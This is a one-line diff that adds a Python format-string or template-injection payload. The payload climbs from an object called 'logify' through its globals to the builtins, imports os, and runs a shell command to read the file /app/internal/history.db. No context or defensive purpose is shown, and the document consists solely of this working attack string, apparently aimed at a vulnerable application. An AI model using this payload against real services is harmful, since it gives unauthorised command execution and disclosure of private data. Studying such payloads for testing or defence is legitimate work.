@@ -1,0 +1,1 @@
+{logify.__init__.__globals__['__builtins__']['__import__']('os').popen('cat /app/internal/history.db').read()}
